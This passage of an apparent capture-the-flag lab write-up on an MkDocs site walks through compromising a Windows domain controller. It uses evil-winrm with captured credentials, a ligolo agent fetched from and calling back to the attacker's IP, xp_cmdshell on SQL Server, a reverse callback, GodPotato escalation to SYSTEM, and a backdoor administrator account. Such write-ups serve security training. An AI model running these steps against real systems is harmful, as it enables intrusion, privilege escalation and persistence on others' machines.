+<div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="m">10</span>.0.19.80<span class="w"> </span>-u<span class="w"> </span>alice.wonderland<span class="w"> </span>-p<span class="w"> </span><span class="s1">'Passw0rd!2025'</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="c1"># it Works</span>
+<a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>whoami<span class="w"> </span>
+<a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>
+<a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a>hack<span class="se">\a</span>lice.wonderland
+</code></pre></div>
+<p>After doing some light enumeration we see MySQL is listening on 127.0.1:1433</p>
+<h2 id="using-ligolo-for-better-pivoting">Using ligolo for better pivoting</h2>
+<blockquote>
+<p>[!info] Tool: <a href="https://github.com/Real-Fruit-Snacks/LigoloSupport">LigoloSupport</a></p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>curl<span class="w"> </span>-O<span class="w"> </span>https://raw.githubusercontent.com/Real-Fruit-Snacks/LigoloSupport/main/ligolo-helper.sh
+<a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>chmod<span class="w"> </span>+x<span class="w"> </span>ligolo-helper.sh
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>sudo<span class="w"> </span>./ligolo-helper.sh<span class="w"> </span>auto
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="c1"># Uploaded binary to target</span>
+<a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>iwr<span class="w"> </span>http://10.200.46.199:8000/ligolo-agent.exe<span class="w"> </span>-o<span class="w"> </span>a.exe
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="c1"># Executed</span>
+<a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>.<span class="se">\a</span>.exe<span class="w"> </span>-connect<span class="w"> </span><span class="m">10</span>.200.46.199:11601<span class="w"> </span>-ignore-cert
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="c1"># added routes</span>
+<a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>/opt/ligolosupport/ligolo-helper.sh<span class="w"> </span>add-route<span class="w"> </span><span class="m">10</span>.10.10.0/24
+<a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a>
+<a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a>ip<span class="w"> </span>route<span class="w"> </span>add<span class="w"> </span><span class="m">240</span>.0.0.1/32<span class="w"> </span>dev<span class="w"> </span>ligolo
+</code></pre></div>
+<blockquote>
+<p>Now lets use our access to try and talk to the internal MySQL</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>impacket-mssqlclient<span class="w"> </span><span class="s1">'HACK.SMARTER/alice.wonderland:Passw0rd!2025@240.0.0.1'</span><span class="w"> </span>-windows-auth
+</code></pre></div>
+<blockquote>
+<p>I'm In...</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Encryption<span class="w"> </span>required,<span class="w"> </span>switching<span class="w"> </span>to<span class="w"> </span>TLS
+<a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>:<span class="w"> </span>Old<span class="w"> </span>Value:<span class="w"> </span>master,<span class="w"> </span>New<span class="w"> </span>Value:<span class="w"> </span>master
+<a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>:<span class="w"> </span>Old<span class="w"> </span>Value:<span class="w"> </span>,<span class="w"> </span>New<span class="w"> </span>Value:<span class="w"> </span>us_english
+<a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>:<span class="w"> </span>Old<span class="w"> </span>Value:<span class="w"> </span><span class="m">4096</span>,<span class="w"> </span>New<span class="w"> </span>Value:<span class="w"> </span><span class="m">16192</span>
+<a id="__codelineno-39-5" name="__codelineno-39-5" href="#__codelineno-39-5"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>INFO<span class="o">(</span>DC01<span class="se">\S</span>QLEXPRESS<span class="o">)</span>:<span class="w"> </span>Line<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>Changed<span class="w"> </span>database<span class="w"> </span>context<span class="w"> </span>to<span class="w"> </span><span class="s1">'master'</span>.
+<a id="__codelineno-39-6" name="__codelineno-39-6" href="#__codelineno-39-6"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>INFO<span class="o">(</span>DC01<span class="se">\S</span>QLEXPRESS<span class="o">)</span>:<span class="w"> </span>Line<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>Changed<span class="w"> </span>language<span class="w"> </span>setting<span class="w"> </span>to<span class="w"> </span>us_english.
+<a id="__codelineno-39-7" name="__codelineno-39-7" href="#__codelineno-39-7"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>ACK:<span class="w"> </span>Result:<span class="w"> </span><span class="m">1</span><span class="w"> </span>-<span class="w"> </span>Microsoft<span class="w"> </span>SQL<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>RTM<span class="w"> </span><span class="o">(</span><span class="m">15</span>.0.2000<span class="o">)</span>
+<a id="__codelineno-39-8" name="__codelineno-39-8" href="#__codelineno-39-8"></a><span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Press<span class="w"> </span><span class="nb">help</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>extra<span class="w"> </span>shell<span class="w"> </span>commands
+<a id="__codelineno-39-9" name="__codelineno-39-9" href="#__codelineno-39-9"></a>SQL<span class="w"> </span><span class="o">(</span>HACK<span class="se">\a</span>lice.wonderland<span class="w">  </span>dbo@master<span class="o">)</span>&gt;<span class="w"> </span>
+</code></pre></div>
+<blockquote>
+<p>[!important] enable_xp_cmdshell</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>enable_xp_cmdshell
+</code></pre></div>
+<blockquote>
+<p>It works... if it didn't I would have tried</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>EXEC<span class="w"> </span>sp_configure<span class="w"> </span><span class="s1">'show advanced options'</span>,<span class="w"> </span><span class="m">1</span><span class="p">;</span>
+<a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>RECONFIGURE<span class="p">;</span>
+<a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a>EXEC<span class="w"> </span>sp_configure<span class="w"> </span><span class="s1">'xp_cmdshell'</span>,<span class="w"> </span><span class="m">1</span><span class="p">;</span>
+<a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a>RECONFIGURE<span class="p">;</span>
+</code></pre></div>
+<h3 id="check-mysql-privs">Check MySQL Privs</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>xp_cmdshell<span class="w"> </span><span class="s2">"whoami"</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>Privilege<span class="w"> </span>Name<span class="w">                </span>Description<span class="w">                               </span><span class="nv">State</span><span class="w">      </span>
+<a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a><span class="o">=============================</span><span class="w"> </span><span class="o">=========================================</span><span class="w"> </span><span class="o">========</span><span class="w">   </span>
+<a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>SeAssignPrimaryTokenPrivilege<span class="w"> </span>Replace<span class="w"> </span>a<span class="w"> </span>process<span class="w"> </span>level<span class="w"> </span>token<span class="w">             </span>Disabled<span class="w">   </span>
+<a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a>SeIncreaseQuotaPrivilege<span class="w">      </span>Adjust<span class="w"> </span>memory<span class="w"> </span>quotas<span class="w"> </span><span class="k">for</span><span class="w"> </span>a<span class="w"> </span>process<span class="w">        </span>Disabled<span class="w">   </span>
+<a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a>SeMachineAccountPrivilege<span class="w">     </span>Add<span class="w"> </span>workstations<span class="w"> </span>to<span class="w"> </span>domain<span class="w">                </span>Disabled<span class="w">   </span>
+<a id="__codelineno-43-6" name="__codelineno-43-6" href="#__codelineno-43-6"></a>SeChangeNotifyPrivilege<span class="w">       </span>Bypass<span class="w"> </span>traverse<span class="w"> </span>checking<span class="w">                  </span>Enabled<span class="w">    </span>
+<a id="__codelineno-43-7" name="__codelineno-43-7" href="#__codelineno-43-7"></a>SeManageVolumePrivilege<span class="w">       </span>Perform<span class="w"> </span>volume<span class="w"> </span>maintenance<span class="w"> </span>tasks<span class="w">          </span>Enabled<span class="w">    </span>
+<a id="__codelineno-43-8" name="__codelineno-43-8" href="#__codelineno-43-8"></a>SeImpersonatePrivilege<span class="w">        </span>Impersonate<span class="w"> </span>a<span class="w"> </span>client<span class="w"> </span>after<span class="w"> </span>authentication<span class="w"> </span>Enabled<span class="w">    </span>
+<a id="__codelineno-43-9" name="__codelineno-43-9" href="#__codelineno-43-9"></a>SeCreateGlobalPrivilege<span class="w">       </span>Create<span class="w"> </span>global<span class="w"> </span>objects<span class="w">                     </span>Enabled<span class="w">    </span>
+<a id="__codelineno-43-10" name="__codelineno-43-10" href="#__codelineno-43-10"></a>SeIncreaseWorkingSetPrivilege<span class="w"> </span>Increase<span class="w"> </span>a<span class="w"> </span>process<span class="w"> </span>working<span class="w"> </span><span class="nb">set</span><span class="w">            </span>Disabled<span class="w">   </span>
+</code></pre></div>
+<blockquote>
+<p>[!important] SeImpersonatePrivilege is Enabled</p>
+</blockquote>
+<h2 id="god-potato-to-privesc-from-mysql">God Potato to PrivEsc from MySQL</h2>
+<blockquote>
+<p>[!info] Tool: <a href="https://github.com/BeichenDream/GodPotato/releases">GodPotato</a></p>
+</blockquote>
+<p>I uploaded GodPotato using Evil-Winrm. Now I need to execute Undertow to catch a callback from inside the MySQL Shell</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="c1"># Move File to World Readable</span>
+<a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a>copy<span class="w"> </span>C:<span class="se">\T</span>emp<span class="se">\u</span>ndertow.exe<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\s</span>pool<span class="se">\d</span>rivers<span class="se">\c</span>olor<span class="se">\u</span>ndertow.exe
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>xp_cmdshell<span class="w"> </span><span class="s2">"C:\Windows\System32\spool\drivers\color\undertow.exe"</span>
+</code></pre></div>
+<blockquote>
+<p>Caught Callback</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>ssh<span class="w"> </span>-MS<span class="w"> </span>/tmp/mysql<span class="w"> </span>a@127.0.0.1<span class="w"> </span>-p<span class="w"> </span><span class="m">46005</span>
+</code></pre></div>
+<blockquote>
+<p>I am in as mssql</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a><span class="c1"># whoami</span>
+<a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>nt<span class="w"> </span>service<span class="se">\m</span>ssql<span class="nv">$sqlexpress</span>
+</code></pre></div>
+<blockquote>
+<p>I moved GodPotato to this same directory.</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>PS<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\s</span>pool<span class="se">\d</span>rivers<span class="se">\c</span>olor<span class="se">\G</span>od.exe<span class="w"> </span>-cmd<span class="w"> </span>whoami
+<a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>CombaseModule:<span class="w"> </span>0x140731942240256
+<a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>DispatchTable:<span class="w"> </span>0x140731944830840
+<a id="__codelineno-48-4" name="__codelineno-48-4" href="#__codelineno-48-4"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>UseProtseqFunction:<span class="w"> </span>0x140731944123184
+<a id="__codelineno-48-5" name="__codelineno-48-5" href="#__codelineno-48-5"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>UseProtseqFunctionParamCount:<span class="w"> </span><span class="m">6</span>
+<a id="__codelineno-48-6" name="__codelineno-48-6" href="#__codelineno-48-6"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>HookRPC
+<a id="__codelineno-48-7" name="__codelineno-48-7" href="#__codelineno-48-7"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Start<span class="w"> </span>PipeServer
+<a id="__codelineno-48-8" name="__codelineno-48-8" href="#__codelineno-48-8"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>CreateNamedPipe<span class="w"> </span><span class="se">\\</span>.<span class="se">\p</span>ipe<span class="se">\9</span>0663cf6-9a93-479e-9a20-78784ed2fe8f<span class="se">\p</span>ipe<span class="se">\e</span>pmapper
+<a id="__codelineno-48-9" name="__codelineno-48-9" href="#__codelineno-48-9"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Trigger<span class="w"> </span>RPCSS
+<a id="__codelineno-48-10" name="__codelineno-48-10" href="#__codelineno-48-10"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>DCOM<span class="w"> </span>obj<span class="w"> </span>GUID:<span class="w"> </span><span class="m">00000000</span>-0000-0000-c000-000000000046
+<a id="__codelineno-48-11" name="__codelineno-48-11" href="#__codelineno-48-11"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>DCOM<span class="w"> </span>obj<span class="w"> </span>IPID:<span class="w"> </span>0000a402-0944-ffff-adb1-86dc5858104f
+<a id="__codelineno-48-12" name="__codelineno-48-12" href="#__codelineno-48-12"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>DCOM<span class="w"> </span>obj<span class="w"> </span>OXID:<span class="w"> </span>0x3bd6b0be262abf2a
+<a id="__codelineno-48-13" name="__codelineno-48-13" href="#__codelineno-48-13"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>DCOM<span class="w"> </span>obj<span class="w"> </span>OID:<span class="w"> </span>0x6a15bb0816f2651f
+<a id="__codelineno-48-14" name="__codelineno-48-14" href="#__codelineno-48-14"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>DCOM<span class="w"> </span>obj<span class="w"> </span>Flags:<span class="w"> </span>0x281
+<a id="__codelineno-48-15" name="__codelineno-48-15" href="#__codelineno-48-15"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>DCOM<span class="w"> </span>obj<span class="w"> </span>PublicRefs:<span class="w"> </span>0x0
+<a id="__codelineno-48-16" name="__codelineno-48-16" href="#__codelineno-48-16"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Marshal<span class="w"> </span>Object<span class="w"> </span>bytes<span class="w"> </span>len:<span class="w"> </span><span class="m">100</span>
+<a id="__codelineno-48-17" name="__codelineno-48-17" href="#__codelineno-48-17"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>UnMarshal<span class="w"> </span>Object
+<a id="__codelineno-48-18" name="__codelineno-48-18" href="#__codelineno-48-18"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Pipe<span class="w"> </span>Connected!
+<a id="__codelineno-48-19" name="__codelineno-48-19" href="#__codelineno-48-19"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>CurrentUser:<span class="w"> </span>NT<span class="w"> </span>AUTHORITY<span class="se">\N</span>ETWORK<span class="w"> </span>SERVICE
+<a id="__codelineno-48-20" name="__codelineno-48-20" href="#__codelineno-48-20"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>CurrentsImpersonationLevel:<span class="w"> </span>Impersonation
+<a id="__codelineno-48-21" name="__codelineno-48-21" href="#__codelineno-48-21"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Start<span class="w"> </span>Search<span class="w"> </span>System<span class="w"> </span>Token
+<a id="__codelineno-48-22" name="__codelineno-48-22" href="#__codelineno-48-22"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>PID<span class="w"> </span>:<span class="w"> </span><span class="m">928</span><span class="w"> </span>Token:0x660<span class="w">  </span>User:<span class="w"> </span>NT<span class="w"> </span>AUTHORITY<span class="se">\S</span>YSTEM<span class="w"> </span>ImpersonationLevel:<span class="w"> </span>Impersonation
+<a id="__codelineno-48-23" name="__codelineno-48-23" href="#__codelineno-48-23"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Find<span class="w"> </span>System<span class="w"> </span>Token<span class="w"> </span>:<span class="w"> </span>True
+<a id="__codelineno-48-24" name="__codelineno-48-24" href="#__codelineno-48-24"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>UnmarshalObject:<span class="w"> </span>0x80070776
+<a id="__codelineno-48-25" name="__codelineno-48-25" href="#__codelineno-48-25"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>CurrentUser:<span class="w"> </span>NT<span class="w"> </span>AUTHORITY<span class="se">\S</span>YSTEM
+<a id="__codelineno-48-26" name="__codelineno-48-26" href="#__codelineno-48-26"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>process<span class="w"> </span>start<span class="w"> </span>with<span class="w"> </span>pid<span class="w"> </span><span class="m">3672</span>
+<a id="__codelineno-48-27" name="__codelineno-48-27" href="#__codelineno-48-27"></a>nt<span class="w"> </span>authority<span class="se">\s</span>ystem
+</code></pre></div>
+<blockquote>
+<p>[!important] got nt authority\system</p>
+</blockquote>
+<h2 id="create-new-user">Create New User</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="c1"># Create User</span>
+<a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a>C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\s</span>pool<span class="se">\d</span>rivers<span class="se">\c</span>olor<span class="se">\G</span>od.exe<span class="w"> </span>-cmd<span class="w"> </span><span class="s2">"net user hacksmarter hacksmart1! /add"</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="c1"># Make Admin</span>
+<a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a>C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\s</span>pool<span class="se">\d</span>rivers<span class="se">\c</span>olor<span class="se">\G</span>od.exe<span class="w"> </span>-cmd<span class="w"> </span><span class="s2">"net localgroup administrators hacksmarter /add"</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="m">10</span>.0.19.80<span class="w"> </span>-u<span class="w"> </span>hacksmarter<span class="w"> </span>-p<span class="w"> </span><span class="s1">'hacksmart1!'</span>
+</code></pre></div>
+<blockquote>
+<p>Got the Root Flag... <code>YWxsIGFib3V0IHRoYXQgcm9vdCwgYm91dCB0aGF0IHJvb3QsIEpVU1QgREEK</code></p>
+</blockquote>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden="">
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"></path></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../../..", "features": ["content.code.copy", "content.code.annotate", "navigation.instant", "navigation.tracking", "navigation.top", "search.suggest", "search.highlight"], "search": "../../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  
+<script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
+document$.subscribe(()=>{ lightbox.reload(); });
+</script></body></html>
